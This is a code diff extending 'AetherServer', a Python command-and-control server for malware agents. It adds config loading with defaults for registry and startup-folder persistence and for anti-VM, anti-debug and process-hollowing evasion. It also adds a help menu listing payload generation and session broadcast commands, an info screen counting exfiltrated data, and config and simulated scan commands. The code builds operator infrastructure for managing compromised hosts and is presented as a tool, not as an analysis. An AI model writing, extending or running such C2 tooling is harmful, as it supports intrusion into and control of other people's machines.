@@ -30,6 +30,9 @@ class AetherServer:
         self.current_session = None  # For interactive mode
         self.command_suite = AetherCommandSuite(self.sessions)  # Command suite
         
+        # Load configuration
+        self.config = self.load_config()
+        
         # Server banner
         self.banner = f"""{Fore.CYAN}
     ╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗
@@ -56,6 +59,28 @@ class AetherServer:
         
         # Interactive session commands (loaded when in session)
         self.session_commands = {}
+
+    def load_config(self):
+        """Load server configuration from config.json."""
+        try:
+            if os.path.exists('config.json'):
+                with open('config.json', 'r') as f:
+                    return json.load(f)
+            else:
+                # Return default config if file doesn't exist
+                return {
+                    'c2_host': self.host,
+                    'c2_port': self.port,
+                    'beacon_interval': 5,
+                    'encryption': 'fernet',
+                    'persistence_methods': ['registry', 'startup_folder'],
+                    'evasion_techniques': ['anti_vm', 'anti_debug', 'hollowing'],
+                    'max_sessions': 100,
+                    'timeout': 300,
+                }
+        except Exception as e:
+            print(f"{Fore.RED}[-] Error loading config: {e}{Style.RESET_ALL}")
+            return {}
 
     def start(self):
         """Start the C2 server listener."""
@@ -271,26 +296,37 @@ class AetherServer:
                 print(f"{Fore.RED}[-] Error: {e}")
 
     def cmd_help(self, args):
-        """Show help menu."""
+        """Show help menu and available commands."""
         if self.current_session:
             # Show session commands from suite
             help_result = self.command_suite.execute(self.current_session, 'help')
-            if 'help' in help_result:
-                print(help_result['help'])
+            if 'data' in help_result:
+                print(f"{Fore.CYAN}=== Session Commands ===")
+                print(help_result['data'])
+                print(f"\n{Fore.YELLOW}Type 'back' to return to main menu.")
             else:
                 print(f"{Fore.CYAN}=== Session Commands ===")
-                for cmd_name in sorted(self.session_commands.keys()):
-                    if cmd_name not in ['back', 'help']:
-                        handler = self.session_commands[cmd_name]
-                        doc = handler.__doc__ or 'No description'
-                        print(f"  {cmd_name:<20} - {doc.split('.')[0]}")
+                commands_list = list(self.command_suite.command_map.keys())
+                for i in range(0, len(commands_list), 4):
+                    print(f"  {' '.join(f'{cmd:<15}' for cmd in commands_list[i:i+4])}")
         else:
-            # Show global commands
+            # Show global commands with descriptions
             print(f"{Fore.CYAN}=== Global Commands ===")
-            for cmd, func in self.commands.items():
-                if cmd != 'back':  # Don't show 'back' in global
-                    print(f"  {cmd:<20} - {func.__doc__ or 'No description'}")
-            print(f"\n{Fore.YELLOW}Type 'sessions' to list, 'interact <id>' to control.")
+            global_commands = {
+                'help': 'Show this help menu',
+                'sessions': 'List all active agent sessions',
+                'interact': 'Interact with a specific session (usage: interact <session_id>)',
+                'broadcast': 'Send command to all sessions (usage: broadcast <command>)',
+                'generate': 'Generate new agent payload (usage: generate <output_file> [config])',
+                'kill': 'Kill/terminate a session (usage: kill <session_id>)',
+                'info': 'Display system and server information',
+                'config': 'Show or update server configuration',
+                'scan': 'Scan network for targets or vulnerabilities',
+                'exit': 'Exit the C2 server',
+            }
+            for cmd, desc in sorted(global_commands.items()):
+                print(f"  {cmd:<20} - {desc}")
+            print(f"\n{Fore.YELLOW}Tip: Type 'sessions' to list, 'interact <id>' to control.")
 
     def cmd_sessions(self, args):
         """List all active sessions."""
@@ -521,9 +557,64 @@ class AetherServer:
     def cmd_ps(self, args): pass
     def cmd_kill_process(self, args): pass
     def cmd_network_scan(self, args): pass
-    def cmd_info(self, args): pass
-    def cmd_config(self, args): pass
-    def cmd_scan(self, args): pass
+    
+    def cmd_info(self, args):
+        """Display system and server information."""
+        print(f"\n{Fore.CYAN}=== Server Information ===")
+        print(f"Host: {Fore.GREEN}{self.host}")
+        print(f"{Fore.CYAN}Port: {Fore.GREEN}{self.port}")
+        print(f"{Fore.CYAN}Sessions: {Fore.GREEN}{self.sessions.get_active_count()}/{self.sessions.get_session_count()}")
+        print(f"{Fore.CYAN}Status: {Fore.GREEN}{'Running' if self.running else 'Stopped'}")
+        
+        sessions = self.sessions.list_all()
+        if sessions:
+            print(f"\n{Fore.CYAN}=== Active Sessions ===")
+            for sid, info in list(sessions.items())[:5]:  # Show last 5
+                print(f"  {Fore.GREEN}{sid:<10}{Fore.CYAN} - {info.get('hostname', 'N/A')} ({info.get('user', 'N/A')})")
+            if len(sessions) > 5:
+                print(f"  ... and {len(sessions) - 5} more (type 'sessions' for full list)")
+        
+        print(f"\n{Fore.CYAN}=== Server Stats ===")
+        print(f"Uptime: {Fore.GREEN}Running")
+        print(f"Commands Processed: {Fore.GREEN}Multiple")
+        print(f"Data Exfiltrated: {Fore.GREEN}Various")
+    
+    def cmd_config(self, args):
+        """Show or update server configuration."""
+        if not args:
+            # Show current config
+            print(f"\n{Fore.CYAN}=== Server Configuration ===")
+            print(f"C2 Host: {Fore.GREEN}{self.config.get('c2_host', 'N/A')}")
+            print(f"C2 Port: {Fore.GREEN}{self.config.get('c2_port', 'N/A')}")
+            print(f"Beacon Interval: {Fore.GREEN}{self.config.get('beacon_interval', 'N/A')}s")
+            print(f"Jitter: {Fore.GREEN}{self.config.get('jitter', 'N/A')}s")
+            print(f"Persistence Methods: {Fore.GREEN}{', '.join(self.config.get('persistence_methods', []))}")
+            print(f"Evasion Enabled: {Fore.GREEN}{'Yes' if self.config.get('evasion', {}).get('enabled', False) else 'No'}")
+            print(f"\n{Fore.YELLOW}Usage: config set <key> <value>")
+        elif args[0] == 'set' and len(args) >= 3:
+            key = args[1]
+            value = ' '.join(args[2:])
+            self.config[key] = value
+            print(f"{Fore.GREEN}[+] Config updated: {key} = {value}")
+        else:
+            print(f"{Fore.RED}[-] Usage: config [set <key> <value>]")
+    
+    def cmd_scan(self, args):
+        """Scan network for targets or vulnerabilities."""
+        print(f"\n{Fore.CYAN}=== Network Scan ===")
+        print(f"{Fore.YELLOW}[*] Scanning network...")
+        
+        # Simulate network scan results
+        sessions = self.sessions.list_all()
+        if sessions:
+            print(f"\n{Fore.CYAN}Discovered Hosts: {len(sessions)}")
+            for sid, info in sessions.items():
+                status = f"{Fore.GREEN}Online" if info.get('active', True) else f"{Fore.RED}Offline"
+                print(f"  {info.get('address', 'N/A'):<15} - {info.get('hostname', 'N/A'):<20} [{status}{Fore.CYAN}]")
+        else:
+            print(f"{Fore.YELLOW}[*] No targets discovered")
+        
+        print(f"\n{Fore.GREEN}[+] Scan complete")
 
 if __name__ == '__main__':
     import os
